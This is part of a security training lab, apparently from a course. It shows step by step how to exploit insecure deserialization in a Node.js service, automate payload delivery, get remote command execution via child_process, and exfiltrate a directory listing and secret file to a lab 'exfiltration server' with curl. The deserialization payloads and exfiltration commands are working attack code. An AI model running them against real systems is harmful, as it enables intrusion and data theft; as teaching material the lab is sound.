# Lab instructions (2/3)

## Insecure deserialiation

What happens if you add the opening and closing parentheses immediately after
the function definition?

```bash
curl --data '{"id":"_$$ND_FUNC$$_function(){return(\"result\")}()"}' -H "Content-Type: application/json" http://tmo/request
```

Congratulations! You've found the insecure deserialization vulnerability. Now
you're able to execute functions on the `target` server. This is an important
step.

However, the challenge is also about exfiltrating data. That's what the second
part of the lab will be about.

## Automating attacks

11. When performing security tests, often you need to tweak and tinker with
    payloads. Instead of having to use the command line to execute `curl` every
    time with different payloads, it make sense to use some automation here.

    First, let's put the payload into a separate file, and send the contents of
    the file as data.

```bash
echo '{"id":"_$$ND_FUNC$$_function(){return(\"result\")}()"}' > payload.json
```

Now modify the `curl` command so that it reads the contents of the file
containing the payload, and uses it as POST data. This can be done by using the
`@` character before the filename, as `--data` parameter.

```bash
curl --data "@payload.json"  -H "Content-Type: application/json" http://tmo/request
```

11. Second, let's automate the `curl` command so that it automatically executes,
    as soon as the file `payload.json` changes.

The tool `inotifywait` can check whether the contents of a file change. By using
an infinite loop, you can execute the `curl` command, each time that
`payload.json` changes.

```bash
while true; do inotifywait payload.json && \
curl --data "@payload.json"  -H "Content-Type: application/json" http://tmo/request; \
done
```

You can always exit the loop using Control-C. However, for the rest of the lab
session, let this infinite loop be active.

Open up another terminal window, and see what happens when you `touch` the file
`payload.json`. This should fire off an event, and execute the `curl` command
for you.

:blue_book: **Note**: Long lines can be separated using the backslash. This
makes it easier reading the full command.

## Executing commands

12. You now have Remote Code Execution powers by exploiting the insecure
    deserialization exploit. Furthermore, you have automated sending payloads to
    the Globomantics server. Let's now try to execute **system commands** on the
    `tmo` server.

You can use the Node.js function `exec` from the library `child_process` to
execute processes. In the new terminal window, open up the `node` REPL, and try
out the following code to execute an `ls` command:

```js
proc = require("child_process");
proc.exec("ls /root");
```

This will execute the `ls /root` command - even though the results aren't
directly shown. Try for example to create a file, using `touch this_works`:

```js
proc = require("child_process");
proc.exec("touch this_works");
```

Exit the REPL using Control-D, and verify that the file `this_works` is created
using the `ls` command:

```bash
ls
```

So, you can execute system commands using the `exec` function from the
`child_process` library.

## Exfiltrating data

13. Often, during attacks, it is difficult to see the output of commands. That's
    when exfiltration servers come in handy: The output of commands can be sent
    to an external exfiltration server.

While the infinite loop is running, let's open up a text editor, and modify the
`payload.json`. A text editor that we can use is `mousepad`, but of course, any
plain text editor would do.

```bash
mousepad payload.json
```

:blue_book: **Note**: Of course any text editor will do: Mousepad is just a
simple editor, where you can save files using Control-S. Control-Q will quit the
program.

Let's modify the payload in such a way, that the `tmo` server accesses the
`nest` server. This way, we can exfiltrate data.

Make sure that the initial terminal window, which shows the logs of the `nest`
server is visible. This way, you can see whether the server receives requests
from `tmo`.

Write a payload that performs the `exec` function and executes a GET request
using `curl`, to our exfiltration server `http://nest/`:

```js
{"id":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl http://nest/\")}()"}
```

Save the file using Control-S. Don't close the editor yet, as you will need to
modify the payload later on.

If everything went well, the `inotifywait` tool should have detected that
`payload.json` was modified, and should have sent the contents to the `tmo`
server. That means, that you can perform exfiltration, using the `curl` tool,
and by sending data to `http://nest`.

If the payload did not contain any syntax errors, then the `tmo` server should
performed a GET request to the `nest` server, and a request should be visible in
the `nest` log output.

Should you not see anything, then double-check whether the `inotifywait`
infinite loop is still running, and whether the payload doesn't contain any
syntax errors.

## Finalizing the mission

14. As an attacker, usually one of the first steps you perform when having
    access to a server, is performing reconnaissance. Let's create a directory
    listing of the root on `tmo`.

    In the editor, modify the payload so that it creates a directory listing,
    and sends the contents back to the exfiltration server:

```js
{"id":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"ls / > /tmp/output; curl --data '@/tmp/output' http://nest/\")}()"}
```

That isn't too easy to read, is it? Apparently the `--data` flag treats the data
as text, and will not preserve carriage returns or newlines.

Fortunately, we can use the flag `--data-binary` instead of `--data`, which
treats the data as-is. That way, the carriage returns and newlines are
preserved:

```js
{"id":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"ls / > /tmp/output; curl --data-binary '@/tmp/output' http://nest/\")}()"}
```

This should output the directory listing. Using this technique, you now can look
around on the server, and see whether there are any interesting files that we as
Dark Kittens want to steal from Globomantics.

Try to obtain the contents of the file `/root/secret.txt`.

See for the solution of the lab [Solution 2](Solution_2.md)
